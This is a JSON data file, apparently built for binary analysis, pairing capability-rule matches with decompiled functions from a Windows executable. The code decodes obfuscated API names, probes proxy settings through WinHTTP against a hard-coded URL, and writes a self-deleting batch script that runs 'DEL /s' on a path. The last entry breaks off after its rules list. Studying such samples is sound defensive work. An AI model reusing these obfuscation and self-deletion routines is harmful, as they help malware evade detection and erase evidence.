    "0040b542": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040b542(int32_t param_1, uint32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong uStack20;\n    \n    if (param_4 == 1) {\n        iVar1 = sub.msvcrt.dll_fgetpos(param_1, &uStack20);\n        if (iVar1 != 0) {\n            return 0xffffffff;\n        }\n        uStack20 = CONCAT44(param_3 + uStack20._4_4_ + CARRY4(param_2, uStack20), param_2 + uStack20);\n    }\n    else if (param_4 == 2) {\n        sub.msvcrt.dll_fflush(param_1);\n        uStack20 = sub.msvcrt.dll__filelengthi64(*(param_1 + 0x10));\n        uStack20 = uStack20 + CONCAT44(param_3, param_2);\n    }\n    else {\n        if (param_4 != 0) {\n            return 0xffffffff;\n        }\n        uStack20 = CONCAT44(param_3, param_2);\n    }\n    uVar2 = sub.msvcrt.dll_fsetpos(param_1, &uStack20);\n    return uVar2;\n}\n",
        "token_count": 297
    },
    "0040b7f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040b7f8(uint param_1, uint param_2, char param_3)\n\n{\n    uint unaff_retaddr;\n    uchar uStack62;\n    uchar uStack61;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack58;\n    uchar uStack57;\n    uchar uStack56;\n    uchar uStack55;\n    uchar uStack54;\n    uchar uStack53;\n    uchar uStack52;\n    uchar uStack51;\n    uchar uStack50;\n    uchar uStack49;\n    uchar uStack48;\n    uchar uStack47;\n    uchar uStack46;\n    uchar uStack45;\n    uchar uStack44;\n    uchar uStack43;\n    uchar uStack42;\n    uchar uStack41;\n    uchar uStack40;\n    uchar uStack39;\n    uchar uStack38;\n    uchar uStack37;\n    uchar uStack36;\n    uchar uStack35;\n    uchar uStack34;\n    uchar uStack33;\n    ushort uStack32;\n    ushort uStack30;\n    uchar auStack28 [2];\n    ushort uStack26;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    \n    fcn.0041a59f(param_1, 0, param_2);\n    if (param_3 == '\\0') {\n        sub.KERNEL32.dll_GetLocalTime(auStack28);\n    }\n    else {\n        sub.KERNEL32.dll_GetSystemTime(auStack28);\n    }\n    uStack62 = 0x25;\n    uStack61 = 0x2e;\n    uStack60 = 0x34;\n    uStack59 = 100;\n    uStack58 = 0x2d;\n    uStack57 = 0x25;\n    uStack56 = 0x2e;\n    uStack55 = 0x32;\n    uStack54 = 100;\n    uStack53 = 0x2d;\n    uStack52 = 0x25;\n    uStack51 = 0x2e;\n    uStack50 = 0x32;\n    uStack49 = 100;\n    uStack48 = 0x20;\n    uStack47 = 0x25;\n    uStack46 = 0x2e;\n    uStack45 = 0x32;\n    uStack44 = 100;\n    uStack43 = 0x3a;\n    uStack42 = 0x25;\n    uStack41 = 0x2e;\n    uStack40 = 0x32;\n    uStack39 = 100;\n    uStack38 = 0x3a;\n    uStack37 = 0x25;\n    uStack36 = 0x2e;\n    uStack35 = 0x32;\n    uStack34 = 100;\n    uStack33 = 0;\n    fcn.00419fa8(unaff_retaddr, param_1, &uStack62, uStack32, uStack30, uStack26, uStack24, uStack22, uStack20);\n    return;\n}\n",
        "token_count": 671
    },
    "0040b99a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuchar fcn.0040b99a(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    uchar uStack13;\n    \n    iStack32 = 0;\n    iStack20 = fcn.00419b7e(0, param_2, param_1);\n    uStack13 = 0;\n    if (-1 < iStack20) {\n        iVar1 = sub.msvcrt.dll_strlen(param_2);\n        iStack20 = iVar1 + iStack20;\n        iStack24 = fcn.00419b7e(iStack20, 0x41ecec, param_1);\n        if ((iStack24 < 1) || (iStack24 < iStack20)) {\n            return 0;\n        }\n        if (0x40 < (iStack24 - iStack20) + 1) {\n            return 0;\n        }\n        iStack32 = sub.msvcrt.dll_calloc((iStack24 - iStack20) + 1, 1);\n        if (iStack32 == 0) {\n            return 0;\n        }\n        fcn.00419918(iStack32, iStack20 + param_1, (iStack24 - iStack20) + 1);\n        iStack28 = fcn.00419b7e(0, 0x41ecee, iStack32);\n        if (iStack28 + 1 < 0x41) {\n            fcn.00419918(param_3, iStack32, iStack28 + 1);\n            fcn.00419918(param_4, iStack32 + iStack28 + 1, 8);\n            uStack13 = 1;\n        }\n    }\n    if (iStack32 != 0) {\n        fcn.0040b4bf(&iStack32);\n    }\n    return uStack13;\n}\n",
        "token_count": 453
    },
    "0040bb33": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0040bb33(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t *piVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    char **ppcVar9;\n    int32_t **ppiVar10;\n    uint uStack32;\n    int32_t aiStack28 [3];\n    char *apcStack16 [3];\n    \n    apcStack16[2] = 0x40bb3e;\n    iVar2 = fcn.0041ce38();\n    iVar2 = -iVar2;\n    *(&stack0x00001108 + iVar2) = 0;\n    *(&stack0xfffffffc + iVar2) = \"U4R-55sTsdR\";\n    *(&stack0xfffffff8 + iVar2) = 0x40bb57;\n    uVar3 = fcn.0040b60e();\n    *(&stack0xfffffffc + iVar2) = \"winhttp.dll\";\n    *(&stack0xfffffff8 + iVar2) = 0x40bb65;\n    uVar4 = sub.KERNEL32.dll_LoadLibraryA();\n    *(&stack0xfffffffc + iVar2) = uVar3;\n    *(&stack0xfffffff8 + iVar2) = uVar4;\n    *(&stack0xfffffff4 + iVar2) = 0x40bb74;\n    uVar3 = sub.KERNEL32.dll_GetProcAddress();\n    *(&stack0x000010f8 + iVar2) = uVar3;\n    *(&stack0xfffffff0 + iVar2) = \"U4R-55sEd590WfZ_W0u0i\";\n    *(&stack0xffffffec + iVar2) = 0x40bb8a;\n    uVar3 = fcn.0040b60e();\n    *(&stack0xfffffff0 + iVar2) = \"winhttp.dll\";\n    *(&stack0xffffffec + iVar2) = 0x40bb98;\n    uVar4 = sub.KERNEL32.dll_LoadLibraryA();\n    *(&stack0xfffffff0 + iVar2) = uVar3;\n    *(&stack0xffffffec + iVar2) = uVar4;\n    *(&stack0xffffffe8 + iVar2) = 0x40bba7;\n    uVar3 = sub.KERNEL32.dll_GetProcAddress();\n    *(&stack0x000010e8 + iVar2) = uVar3;\n    ppcVar9 = &stack0xffffffe4 + iVar2;\n    if ((*(&stack0x000010ec + iVar2) != 0) && (ppcVar9 = &stack0xffffffe4 + iVar2,  *(&stack0x000010e8 + iVar2) != 0)) {\n        *(&stack0x00000078 + iVar2) = 0x49;\n        *(&stack0x0000007a + iVar2) = 0x6e;\n        *(&stack0x0000007c + iVar2) = 0x74;\n        *(&stack0x0000007e + iVar2) = 0x65;\n        *(&stack0x00000080 + iVar2) = 0x72;\n        *(&stack0x00000082 + iVar2) = 0x6e;\n        *(&stack0x00000084 + iVar2) = 0x65;\n        *(&stack0x00000086 + iVar2) = 0x74;\n        *(&stack0x00000088 + iVar2) = 0x50;\n        *(&stack0x0000008a + iVar2) = 0x72;\n        *(&stack0x0000008c + iVar2) = 0x6f;\n        *(&stack0x0000008e + iVar2) = 0x78;\n        *(&stack0x00000090 + iVar2) = 0x79;\n        *(&stack0x00000092 + iVar2) = 0;\n        *(&stack0xfffffff4 + iVar2) = 0;\n        *(&stack0xfffffff0 + iVar2) = 0;\n        *(&stack0xffffffec + iVar2) = 0;\n        *(&stack0xffffffe8 + iVar2) = 1;\n        *(&stack0xffffffe4 + iVar2) = &stack0x00000078 + iVar2;\n        puVar7 = &stack0xffffffe0 + iVar2;\n        *(&stack0xffffffe0 + iVar2) = 0x40bc8c;\n        uVar3 = (**(&stack0x000010ec + iVar2))();\n        *(puVar7 + 0x10ec) = uVar3;\n        ppcVar9 = puVar7 + -0x14;\n        if (*(puVar7 + 0x10ec) != 0) {\n            *(puVar7 + -0xc) = 0x18;\n            *(puVar7 + -0x10) = 0;\n            *(puVar7 + -0x14) = puVar7 + 0x68;\n            *(puVar7 + -0x18) = 0x40bcc0;\n            sub.msvcrt.dll_memset();\n            *(puVar7 + -0xc) = 0xc;\n            *(puVar7 + -0x10) = 0;\n            *(puVar7 + -0x14) = puVar7 + 0x5c;\n            *(puVar7 + -0x18) = 0x40bcdc;\n            sub.msvcrt.dll_memset();\n            *(puVar7 + 0x68) = 1;\n            *(puVar7 + 0x6c) = 3;\n            *(puVar7 + 0x7c) = 1;\n            *(puVar7 + 0x16) = 0x68;\n            *(puVar7 + 0x18) = 0x74;\n            *(puVar7 + 0x1a) = 0x74;\n            *(puVar7 + 0x1c) = 0x70;\n            *(puVar7 + 0x1e) = 0x3a;\n            *(puVar7 + 0x20) = 0x2f;\n            *(puVar7 + 0x22) = 0x2f;\n            *(puVar7 + 0x24) = 0x77;\n            *(puVar7 + 0x26) = 0x77;\n            *(puVar7 + 0x28) = 0x77;\n            *(puVar7 + 0x2a) = 0x2e;\n            *(puVar7 + 0x2c) = 0x79;\n            *(puVar7 + 0x2e) = 0x61;\n            *(puVar7 + 0x30) = 0x6e;\n            *(puVar7 + 0x32) = 100;\n            *(puVar7 + 0x34) = 0x65;\n            *(puVar7 + 0x36) = 0x78;\n            *(puVar7 + 0x38) = 0x2e;\n            *(puVar7 + 0x3a) = 99;\n            *(puVar7 + 0x3c) = 0x6f;\n            *(puVar7 + 0x3e) = 0x6d;\n            *(puVar7 + 0x40) = 0;\n            *(puVar7 + -8) = puVar7 + 0x5c;\n            *(puVar7 + -0xc) = puVar7 + 0x68;\n            *(puVar7 + -0x10) = puVar7 + 0x16;\n            *(puVar7 + -0x14) = *(puVar7 + 0x10ec);\n            puVar8 = puVar7 + -0x18;\n            *(puVar7 + -0x18) = 0x40bdbf;\n            iVar2 = (**(puVar7 + 0x10f0))();\n            ppcVar9 = puVar8 + -0x10;\n            if (iVar2 != 0) {\n                *(puVar8 + -4) = *(puVar8 + 100);\n                *(puVar8 + -8) = 0x41ed1e;\n                *(puVar8 + -0xc) = 0x1000;\n                *(puVar8 + -0x10) = puVar8 + 0xe8;\n                *(puVar8 + -0x14) = 0x40bdf1;\n                fcn.00419fa8();\n                *(puVar8 + -8) = 0x1000;\n                *(puVar8 + -0xc) = 0x41ecec;\n                *(puVar8 + -0x10) = puVar8 + 0xe8;\n                *(puVar8 + -0x14) = 0x40be10;\n                fcn.004199a8();\n                puVar8[0x5a] = 0x68;\n                puVar8[0x5b] = 0x74;\n                puVar8[0x5c] = 0x74;\n                puVar8[0x5d] = 0x70;\n                puVar8[0x5e] = 0x3d;\n                puVar8[0x5f] = 0;\n                *(puVar8 + -4) = puVar8 + 0xa0;\n                *(puVar8 + -8) = puVar8 + 0xa8;\n                *(puVar8 + -0xc) = puVar8 + 0x5a;\n                *(puVar8 + -0x10) = puVar8 + 0xe8;\n                *(puVar8 + -0x14) = 0x40be5b;\n                cVar1 = fcn.0040b99a();\n                if (cVar1 != '\\0') {\n                    *(puVar8 + -0x10) = 0x8c;\n                    *(puVar8 + -0x14) = 0x40be6f;\n                    uVar3 = sub.msvcrt.dll_malloc();\n                    *(puVar8 + 0x10fc) = uVar3;\n                    *(puVar8 + -8) = 0x40;\n                    *(puVar8 + -0xc) = puVar8 + 0xa8;\n                    *(puVar8 + -0x10) = *(puVar8 + 0x10fc) + 4;\n                    *(puVar8 + -0x14) = 0x40be9b;\n                    fcn.00419918();\n                    **(puVar8 + 0x10fc) = 3;\n                    *(puVar8 + -0x10) = puVar8 + 0xa0;\n                    *(puVar8 + -0x14) = 0x40beb7;\n                    uVar3 = fcn.00419d08();\n                    *(*(puVar8 + 0x10fc) + 0x44) = uVar3;\n                    *(*(puVar8 + 0x10fc) + 0x88) = *0x424304;\n                    *0x424304 = *(puVar8 + 0x10fc);\n                    *(puVar8 + -8) = 4;\n                    *(puVar8 + -0xc) = 0x41ed21;\n                    *(puVar8 + -0x10) = 0x41e7a8;\n                    *(puVar8 + -0x14) = 0x40befc;\n                    fcn.00419918();\n                }\n                puVar8[0x53] = 0x73;\n                puVar8[0x54] = 0x6f;\n                puVar8[0x55] = 99;\n                puVar8[0x56] = 0x6b;\n                puVar8[0x57] = 0x73;\n                puVar8[0x58] = 0x3d;\n                puVar8[0x59] = 0;\n                *(puVar8 + -4) = puVar8 + 0xa0;\n                *(puVar8 + -8) = puVar8 + 0xa8;\n                *(puVar8 + -0xc) = puVar8 + 0x53;\n                *(puVar8 + -0x10) = puVar8 + 0xe8;\n                *(puVar8 + -0x14) = 0x40bf4c;\n                cVar1 = fcn.0040b99a();\n                ppcVar9 = puVar8 + -0x10;\n                if (cVar1 != '\\0') {\n                    *(puVar8 + -0x10) = 0x8c;\n                    *(puVar8 + -0x14) = 0x40bf60;\n                    uVar3 = sub.msvcrt.dll_malloc();\n                    *(puVar8 + 0x10fc) = uVar3;\n                    *(puVar8 + -8) = 0x40;\n                    *(puVar8 + -0xc) = puVar8 + 0xa8;\n                    *(puVar8 + -0x10) = *(puVar8 + 0x10fc) + 4;\n                    *(puVar8 + -0x14) = 0x40bf8c;\n                    fcn.00419918();\n                    **(puVar8 + 0x10fc) = 0;\n                    *(puVar8 + -0x10) = puVar8 + 0xa0;\n                    *(puVar8 + -0x14) = 0x40bfa8;\n                    uVar3 = fcn.00419d08();\n                    *(*(puVar8 + 0x10fc) + 0x44) = uVar3;\n                    *(*(puVar8 + 0x10fc) + 0x88) = *0x424304;\n                    *0x424304 = *(puVar8 + 0x10fc);\n                    *(puVar8 + -0x10) = 0x8c;\n                    *(puVar8 + -0x14) = 0x40bfdd;\n                    uVar3 = sub.msvcrt.dll_malloc();\n                    *(puVar8 + 0x10fc) = uVar3;\n                    *(puVar8 + -8) = 0x40;\n                    *(puVar8 + -0xc) = puVar8 + 0xa8;\n                    *(puVar8 + -0x10) = *(puVar8 + 0x10fc) + 4;\n                    *(puVar8 + -0x14) = 0x40c009;\n                    fcn.00419918();\n                    **(puVar8 + 0x10fc) = 2;\n                    *(puVar8 + -0x10) = puVar8 + 0xa0;\n                    *(puVar8 + -0x14) = 0x40c025;\n                    uVar3 = fcn.00419d08();\n                    *(*(puVar8 + 0x10fc) + 0x44) = uVar3;\n                    *(*(puVar8 + 0x10fc) + 0x88) = *0x424304;\n                    *0x424304 = *(puVar8 + 0x10fc);\n                    *(puVar8 + -8) = 4;\n                    *(puVar8 + -0xc) = 0x41ed21;\n                    *(puVar8 + -0x10) = 0x41e7a8;\n                    *(puVar8 + -0x14) = 0x40c06a;\n                    fcn.00419918();\n                    ppcVar9 = puVar8 + -0x10;\n                }\n            }\n        }\n    }\n    *ppcVar9 = \"U4R-55sEd5Xj90WfZPWR84n_W0PQ00dR5u6d0\";\n    ppcVar9[-1] = 0x40c076;\n    uVar3 = fcn.0040b60e();\n    *ppcVar9 = \"winhttp.dll\";\n    ppcVar9[-1] = 0x40c084;\n    uVar4 = sub.KERNEL32.dll_LoadLibraryA();\n    *ppcVar9 = uVar3;\n    ppcVar9[-1] = uVar4;\n    ppcVar9[-2] = 0x40c093;\n    pcVar5 = sub.KERNEL32.dll_GetProcAddress();\n    ppcVar9[0x43c] = pcVar5;\n    if (ppcVar9[0x43c] != NULL) {\n        ppcVar9[-3] = 0x10;\n        ppcVar9[-4] = 0x40c0b7;\n        pcVar5 = sub.msvcrt.dll_malloc();\n        ppcVar9[0x43b] = pcVar5;\n        ppcVar9[-3] = ppcVar9[0x43b];\n        ppiVar10 = ppcVar9 + -4;\n        ppcVar9[-4] = 0x40c0d1;\n        iVar2 = (*ppcVar9[0x43c])();\n        if (iVar2 != 0) {\n            ppiVar10[2] = ppiVar10[0x43d][2];\n            ppiVar10[1] = 0x41ed1e;\n            *ppiVar10 = 0x1000;\n            ppiVar10[-1] = ppiVar10 + 0x3d;\n            ppiVar10[-2] = 0x40c109;\n            fcn.00419fa8();\n            ppiVar10[1] = 0x1000;\n            *ppiVar10 = 0x41ecec;\n            ppiVar10[-1] = ppiVar10 + 0x3d;\n            ppiVar10[-2] = 0x40c128;\n            fcn.004199a8();\n            *(ppiVar10 + 0x59) = 0x68;\n            *(ppiVar10 + 0x5a) = 0x74;\n            *(ppiVar10 + 0x5b) = 0x74;\n            *(ppiVar10 + 0x17) = 0x70;\n            *(ppiVar10 + 0x5d) = 0x3d;\n            *(ppiVar10 + 0x5e) = 0;\n            ppiVar10[2] = ppiVar10 + 0x2b;\n            ppiVar10[1] = ppiVar10 + 0x2d;\n            *ppiVar10 = ppiVar10 + 0x59;\n            ppiVar10[-1] = ppiVar10 + 0x3d;\n            ppiVar10[-2] = 0x40c173;\n            cVar1 = fcn.0040b99a();\n            if (cVar1 != '\\0') {\n                ppiVar10[-1] = 0x8c;\n                ppiVar10[-2] = 0x40c187;\n                piVar6 = sub.msvcrt.dll_malloc();\n                ppiVar10[0x442] = piVar6;\n                ppiVar10[1] = 0x40;\n                *ppiVar10 = ppiVar10 + 0x2d;\n                ppiVar10[-1] = ppiVar10[0x442] + 1;\n                ppiVar10[-2] = 0x40c1b3;\n                fcn.00419918();\n                *ppiVar10[0x442] = 3;\n                ppiVar10[-1] = ppiVar10 + 0x2b;\n                ppiVar10[-2] = 0x40c1cf;\n                iVar2 = fcn.00419d08();\n                ppiVar10[0x442][0x11] = iVar2;\n                ppiVar10[0x442][0x22] = *0x424304;\n                *0x424304 = ppiVar10[0x442];\n                ppiVar10[1] = 0x4;\n                *ppiVar10 = 0x41ed21;\n                ppiVar10[-1] = 0x41e7a8;\n                ppiVar10[-2] = 0x40c214;\n                fcn.00419918();\n            }\n            *(ppiVar10 + 0x52) = 0x73;\n            *(ppiVar10 + 0x53) = 0x6f;\n            *(ppiVar10 + 0x15) = 99;\n            *(ppiVar10 + 0x55) = 0x6b;\n            *(ppiVar10 + 0x56) = 0x73;\n            *(ppiVar10 + 0x57) = 0x3d;\n            *(ppiVar10 + 0x16) = 0;\n            ppiVar10[2] = ppiVar10 + 0x2b;\n            ppiVar10[1] = ppiVar10 + 0x2d;\n            *ppiVar10 = ppiVar10 + 0x52;\n            ppiVar10[-1] = ppiVar10 + 0x3d;\n            ppiVar10[-2] = 0x40c264;\n            cVar1 = fcn.0040b99a();\n            if (cVar1 != '\\0') {\n                ppiVar10[-1] = 0x8c;\n                ppiVar10[-2] = 0x40c278;\n                piVar6 = sub.msvcrt.dll_malloc();\n                ppiVar10[0x442] = piVar6;\n                ppiVar10[1] = 0x40;\n                *ppiVar10 = ppiVar10 + 0x2d;\n                ppiVar10[-1] = ppiVar10[0x442] + 1;\n                ppiVar10[-2] = 0x40c2a4;\n                fcn.00419918();\n                *ppiVar10[0x442] = 2;\n                ppiVar10[-1] = ppiVar10 + 0x2b;\n                ppiVar10[-2] = 0x40c2c0;\n                iVar2 = fcn.00419d08();\n                ppiVar10[0x442][0x11] = iVar2;\n                ppiVar10[0x442][0x22] = *0x424304;\n                *0x424304 = ppiVar10[0x442];\n                ppiVar10[-1] = 0x8c;\n                ppiVar10[-2] = 0x40c2f5;\n                piVar6 = sub.msvcrt.dll_malloc();\n                ppiVar10[0x442] = piVar6;\n                ppiVar10[1] = 0x40;\n                *ppiVar10 = ppiVar10 + 0x2d;\n                ppiVar10[-1] = ppiVar10[0x442] + 1;\n                ppiVar10[-2] = 0x40c321;\n                fcn.00419918();\n                *ppiVar10[0x442] = 0;\n                ppiVar10[-1] = ppiVar10 + 0x2b;\n                ppiVar10[-2] = 0x40c33d;\n                iVar2 = fcn.00419d08();\n                ppiVar10[0x442][0x11] = iVar2;\n                ppiVar10[0x442][0x22] = *0x424304;\n                *0x424304 = ppiVar10[0x442];\n                ppiVar10[1] = 0x4;\n                *ppiVar10 = 0x41ed21;\n                ppiVar10[-1] = 0x41e7a8;\n                ppiVar10[-2] = 0x40c382;\n                fcn.00419918();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 5449
    },
    "0040c38b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.0040c38b(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack4;\n    \n    uStack4 = 0x40c395;\n    iVar1 = fcn.0041ce38();\n    iVar1 = -iVar1;\n    *(&stack0x00000008 + iVar1) = 0x104;\n    *(&stack0x00000004 + iVar1) = 0;\n    *(&stack0x00000000 + iVar1) = &stack0x0000002c + iVar1;\n    *(&stack0xfffffffc + iVar1) = 0x40c3b3;\n    fcn.0041a59f();\n    *(&stack0x00000004 + iVar1) = 10;\n    *(&stack0x00000000 + iVar1) = 6;\n    *(&stack0xfffffffc + iVar1) = 0x40c3c7;\n    uVar2 = fcn.00416487();\n    *(&stack0x00000004 + iVar1) = uVar2;\n    *(&stack0x00000000 + iVar1) = &stack0x0000002c + iVar1;\n    *(&stack0xfffffffc + iVar1) = 0x40c3d7;\n    fcn.0041652e();\n    *(&stack0x00000000 + iVar1) = \"TEMP\";\n    *(&stack0xfffffffc + iVar1) = 0x40c3e3;\n    uVar2 = sub.msvcrt.dll_getenv();\n    *(&stack0x00000010 + iVar1) = &stack0x0000002c + iVar1;\n    *(&stack0x0000000c + iVar1) = uVar2;\n    *(&stack0x00000008 + iVar1) = \"%s\\\\%s.bat\";\n    *(&stack0x00000004 + iVar1) = 0x204;\n    *(&stack0x00000000 + iVar1) = &stack0x00000334 + iVar1;\n    *(&stack0xfffffffc + iVar1) = 0x40c40e;\n    fcn.00419fa8();\n    *(&stack0x00000010 + iVar1) = *(&stack0x00001550 + iVar1);\n    *(&stack0x0000000c + iVar1) = *(&stack0x00001554 + iVar1);\n    *(&stack0x00000008 + iVar1) =\n         \"@echo off\\r\\nping 192.0.2.2 -n 1 -w %d >nul 2>&1\\r\\nDEL /s \\\"%s\\\" >nul 2>&1\\r\\ncall :deleteSelf&exit /b\\r\\n:deleteSelf\\r\\nstart /b \\\"\\\" cmd /c del \\\"%%~f0\\\"&exit /b\\r\\n\"\n    ;\n    *(&stack0x00000004 + iVar1) = 0x1000;\n    *(&stack0x00000000 + iVar1) = &stack0x00000538 + iVar1;\n    *(&stack0xfffffffc + iVar1) = 0x40c443;\n    uVar2 = fcn.00419fa8();\n    *(&stack0x0000153c + iVar1) = uVar2;\n    if (*(&stack0x0000153c + iVar1) < 0x96) {\n        uVar2 = 0;\n    }\n    else {\n        *(&stack0x00000004 + iVar1) = 0x41ed59;\n        *(&stack0x00000000 + iVar1) = &stack0x00000334 + iVar1;\n        *(&stack0xfffffffc + iVar1) = 0x40c478;\n        uVar2 = sub.msvcrt.dll_fopen();\n        *(&stack0x00001538 + iVar1) = uVar2;\n        if (*(&stack0x00001538 + iVar1) == 0) {\n            uVar2 = 0;\n        }\n        else {\n            *(&stack0x0000000c + iVar1) = *(&stack0x00001538 + iVar1);\n            *(&stack0x00000008 + iVar1) = *(&stack0x0000153c + iVar1);\n            *(&stack0x00000004 + iVar1) = 1;\n            *(&stack0x00000000 + iVar1) = &stack0x00000538 + iVar1;\n            *(&stack0xfffffffc + iVar1) = 0x40c4ba;\n            sub.msvcrt.dll_fwrite();\n            *(&stack0x00000000 + iVar1) = *(&stack0x00001538 + iVar1);\n            *(&stack0xfffffffc + iVar1) = 0x40c4c9;\n            sub.msvcrt.dll_fclose();\n            *(&stack0x00000000 + iVar1) = 0x41ed5c;\n            *(&stack0xfffffffc + iVar1) = 0x40c4d5;\n            uVar2 = sub.msvcrt.dll_getenv();\n            *(&stack0x00000010 + iVar1) = &stack0x00000334 + iVar1;\n            *(&stack0x0000000c + iVar1) = uVar2;\n            *(&stack0x00000008 + iVar1) = \"%s /c \\\"%s\\\"\";\n            *(&stack0x00000004 + iVar1) = 0x204;\n            *(&stack0x00000000 + iVar1) = &stack0x00000130 + iVar1;\n            *(&stack0xfffffffc + iVar1) = 0x40c503;\n            fcn.00419fa8();\n            *(&stack0x00000008 + iVar1) = 0;\n            *(&stack0x00000004 + iVar1) = &stack0x00000130 + iVar1;\n            *(&stack0x00000000 + iVar1) = 0;\n            *(&stack0xfffffffc + iVar1) = 0x40c522;\n            fcn.0040a8af();\n            uVar2 = 1;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1395
    },
    "0040c535": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040c535(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar auStack1052 [516];\n    uchar auStack536 [516];\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iStack16 = -1;\n    iStack20 = 0;\n    do {\n        if (3 < iStack20) {\ncode_r0x0040c5c1:\n            if (-1 < iStack16) {\n                cVar1 = fcn.0040afc7(iStack16, auStack1052, 0x204);\n                if (cVar1 != '\\0') {\n                    cVar1 = fcn.0040aa34(auStack1052);\n                    if (cVar1 == '\\0') {\n                        cVar1 = fcn.0040aa6f(auStack1052);\n                        if (cVar1 != '\\0') {\n                            fcn.0040adee(auStack1052);\n                        }\n                    }\n                    else {\n                        fcn.0040a9af(auStack1052);\n                    }\n                }\n            }\n            return;\n        }\n        cVar1 = fcn.0040afc7(iStack20, auStack536, 0x204);\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.0041a18a(0x41ed6f, auStack536, 2);\n            if (iVar2 == 0) {\n                iStack16 = iStack20 + 1;\n                goto code_r0x0040c5c1;\n            }\n        }\n        iStack20 = iStack20 + 1;\n    } while( true );\n}\n",
        "token_count": 373
    },
    "0040ccea": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040ccea(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar auStack548 [4];\n    uchar uStack544;\n    uchar auStack543 [511];\n    int32_t iStack32;\n    uint *puStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    fcn.0040cb70();\n    iStack24 = sub.msvcrt.dll_malloc(0x48);\n    *0x424300 = iStack24;\n    *(iStack24 + 0x44) = iStack24;\n    iStack16 = 0;\n    iStack20 = fcn.0041a47f(0x3b, 0x41e3e0);\n    do {\n        *0x424300 = *(*0x424300 + 0x44);\n        fcn.00419a6a(0x41e3e0, 0x3b, iStack16 + 1, &uStack544, 0x200);\n        fcn.00419a6a(&uStack544, 0x3a, 1, *0x424300, 0x40);\n        iVar3 = *0x424300;\n        iVar1 = sub.msvcrt.dll_strlen(*0x424300);\n        uVar2 = fcn.00419d08(auStack543 + iVar1);\n        *(iVar3 + 0x40) = uVar2;\n        iVar3 = *0x424300;\n        uVar2 = sub.msvcrt.dll_malloc(0x48);\n        *(iVar3 + 0x44) = uVar2;\n        iStack16 = iStack16 + 1;\n        iStack20 = iStack20 + -1;\n    } while (iStack20 != 0);\n    fcn.0040b4bf(*0x424300 + 0x44);\n    *(*0x424300 + 0x44) = iStack24;\n    *0x424300 = iStack24;\n    puStack28 = NULL;\n    iStack32 = fcn.0041a47f(0x3b, 0x41e4e0);\n    for (iStack16 = 0; iStack16 < iStack32; iStack16 = iStack16 + 1) {\n        puStack28 = sub.msvcrt.dll_malloc(0x8c);\n        fcn.00419a6a(0x41e4e0, 0x3b, iStack16 + 1, &uStack544, 0x200);\n        fcn.00419a6a(&uStack544, 0x3a, 1, auStack548, 4);\n        fcn.00419a6a(&uStack544, 0x3a, 2, puStack28 + 1, 0x40);\n        uVar2 = fcn.00419d08(auStack548);\n        *puStack28 = uVar2;\n        iVar3 = sub.msvcrt.dll_strlen(puStack28 + 1);\n        uVar2 = fcn.00419d08(auStack543 + iVar3 + 2);\n        puStack28[0x11] = uVar2;\n        puStack28[0x22] = *0x424304;\n        *0x424304 = puStack28;\n    }\n    return;\n}\n",
        "token_count": 766
    },
    "0040cfcb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
